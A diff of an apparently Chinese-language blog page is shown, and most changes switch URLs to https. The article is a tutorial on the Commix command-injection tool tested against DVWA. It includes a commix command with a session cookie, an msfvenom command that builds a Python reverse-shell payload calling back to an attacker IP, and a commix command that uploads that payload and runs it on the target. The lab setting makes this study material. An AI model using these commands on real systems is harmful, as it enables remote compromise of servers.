@@ -82,18 +82,18 @@
 <meta name="description" content="命令注入简介：命令注入也称shell注入或者OS注入。主机操作系统的任意命令通过易受攻击的应用程序执行，当Web应用程序将不安全的用户数据发送到系统shell时，可能会发生此类攻击。此用户数据可以是任何形式，例如表单，cookie，HTTP标头等 Commix简介：Commix是自动化的用于利用Web应用程序中命令注入的漏洞，可以很容易找到与命令注入相关的漏洞，然后进一步利用。 Commix有各种">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Commix-Command Injection Exploiter">
-<meta property="og:url" content="http://mktubu.github.io/2019/03/24/Commix/index.html">
+<meta property="og:url" content="https://mktubu.github.io/2019/03/24/Commix/index.html">
 <meta property="og:site_name" content="重明">
 <meta property="og:description" content="命令注入简介：命令注入也称shell注入或者OS注入。主机操作系统的任意命令通过易受攻击的应用程序执行，当Web应用程序将不安全的用户数据发送到系统shell时，可能会发生此类攻击。此用户数据可以是任何形式，例如表单，cookie，HTTP标头等 Commix简介：Commix是自动化的用于利用Web应用程序中命令注入的漏洞，可以很容易找到与命令注入相关的漏洞，然后进一步利用。 Commix有各种">
-<meta property="og:image" content="http://mktubu.github.io/2019/03/24/Commix/%5Cimages%5Ccommix%5C1.jpg">
-<meta property="og:image" content="http://mktubu.github.io/2019/03/24/Commix/%5Cimages%5Ccommix%5C2.jpg">
-<meta property="og:image" content="http://mktubu.github.io/2019/03/24/Commix/%5Cimages%5Ccommix%5C3.jpg">
-<meta property="og:image" content="http://mktubu.github.io/2019/03/24/Commix/%5Cimages%5Ccommix%5C4.jpg">
+<meta property="og:image" content="https://mktubu.github.io/2019/03/24/Commix/%5Cimages%5Ccommix%5C1.jpg">
+<meta property="og:image" content="https://mktubu.github.io/2019/03/24/Commix/%5Cimages%5Ccommix%5C2.jpg">
+<meta property="og:image" content="https://mktubu.github.io/2019/03/24/Commix/%5Cimages%5Ccommix%5C3.jpg">
+<meta property="og:image" content="https://mktubu.github.io/2019/03/24/Commix/%5Cimages%5Ccommix%5C4.jpg">
 <meta property="article:published_time" content="2019-03-24T12:41:01.000Z">
 <meta property="article:modified_time" content="2019-03-25T11:35:15.743Z">
 <meta property="article:author" content="ChongMing">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://mktubu.github.io/2019/03/24/Commix/%5Cimages%5Ccommix%5C1.jpg">
+<meta name="twitter:image" content="https://mktubu.github.io/2019/03/24/Commix/%5Cimages%5Ccommix%5C1.jpg">
 
 
 
@@ -123,7 +123,7 @@
 
 
 
-  <link rel="canonical" href="http://mktubu.github.io/2019/03/24/Commix/"/>
+  <link rel="canonical" href="https://mktubu.github.io/2019/03/24/Commix/"/>
 
 
 
@@ -290,7 +290,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://mktubu.github.io/2019/03/24/Commix/">
+    <link itemprop="mainEntityOfPage" href="https://mktubu.github.io/2019/03/24/Commix/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="ChongMing">
@@ -384,34 +384,34 @@
 <p>Commix有各种命令选项，可以使用它们来查找目标应用程序并与之连接。</p>
 <a id="more"></a>
 
-<h5 id="Commix中的命令注入类型："><a href="#Commix中的命令注入类型：" class="headerlink" title="Commix中的命令注入类型："></a>Commix中的命令注入类型：</h5><p><font color=red><strong>基于结果的命令注入:</strong></font></p>
+<h5 id="Commix中的命令注入类型："><a href="#Commix中的命令注入类型：" class="headerlink" title="Commix中的命令注入类型："></a>Commix中的命令注入类型：</h5><p><font color="red"><strong>基于结果的命令注入:</strong></font></p>
 <p>这种类型的注入攻击允许通过Web应用程序的结果推断注入命令的结果</p>
 <ul>
 <li>基于经典结果的注入：这是最常用的命令注入，也是最简单的。使用几个常见的操作符将正确的命令与注入命令链接在一起，或者完全排除初始命令，然后继续执行注入的命令，进一步分为Shellcode，ICMP exfiltration ，DNS exfiltration。</li>
 <li>基于eval的技术：在目标Web应用程序易受eval()函数攻击的情况下使用此技术。该eval函数用于执行在运行时期间在所述函数中定义的特殊代码。</li>
 </ul>
-<p><font color=red><strong>盲命令注入:</strong></font></p>
+<p><font color="red"><strong>盲命令注入:</strong></font></p>
 <p>执行注入的shell命令后检索数据的方式是俩种类型的工作之间的主要区别，在Web应用程序下不向攻击者提供任何结果的情况下没使用盲命令注入</p>
 <ul>
 <li>基于时间技术：延迟执行注入命令的时间。通过检查应用程序回复所花费的时间将使攻击者能够确定命令是否成功执行。</li>
 <li>基于文件的技术：如果无法通过反应来确定Web应用程序的结果，则使用该方法。将允许编写要在文件中可访问的命令集。</li>
 </ul>
-<h5 id="在DVWA上进行测试"><a href="#在DVWA上进行测试" class="headerlink" title="在DVWA上进行测试"></a>在DVWA上进行测试</h5><p><img src="%5Cimages%5Ccommix%5C1.jpg" alt="1"></p>
+<h5 id="在DVWA上进行测试"><a href="#在DVWA上进行测试" class="headerlink" title="在DVWA上进行测试"></a>在DVWA上进行测试</h5><p><img src="/2019/03/24/Commix/%5Cimages%5Ccommix%5C1.jpg" alt="1"></p>
 <ul>
 <li>使用Burp抓包获取到cookie</li>
 </ul>
-<p><img src="%5Cimages%5Ccommix%5C2.jpg" alt="2"></p>
+<p><img src="/2019/03/24/Commix/%5Cimages%5Ccommix%5C2.jpg" alt="2"></p>
 <ul>
 <li>使用参数<code>-cookie和-data</code>来验证会话，用这俩个参数发送数据字符串，以便利用POST方法并同时验证会话</li>
 </ul>
 <p>命令：<code>commix -u http://192.168.1.38/DVWA/vulnerabilities/exec/ --cookie=&quot;PHPSESSID=pine68kenlqols1k12vobglj81&quot; --data=&quot;ip=192.168.1.38&amp;Submit=Submit&quot;</code></p>
 <p>会获得以下会话：</p>
-<p><img src="%5Cimages%5Ccommix%5C3.jpg" alt="3"></p>
+<p><img src="/2019/03/24/Commix/%5Cimages%5Ccommix%5C3.jpg" alt="3"></p>
 <ul>
 <li>使用msfvenom创建恶意文件</li>
 </ul>
 <p><code>msfvenom -p python/meteroreter/reverse_tcp lhost=192.168.1.44 lport=1234 -f raw &gt;venom.py</code></p>
-<p><img src="%5Cimages%5Ccommix%5C4.jpg" alt="4"></p>
+<p><img src="/2019/03/24/Commix/%5Cimages%5Ccommix%5C4.jpg" alt="4"></p>
 <ul>
 <li><p>将恶意文件上传到目标并运行</p>
 <p><code>commix -u http://192.168.1.38/DVWA/vulnerabilities/exec/ cookie=&quot;PHPSESSID=pine68kenlqols1k12vobglj81&quot; --data=&quot;ip=192.168.1.38&amp;Submit=Submit&quot; --file-write=&quot;/root/venom.py&quot; --file-dest=&quot;/tmp/venom.py&quot; --os-cmd=&quot;python /tmp/venom.py&quot;</code></p>
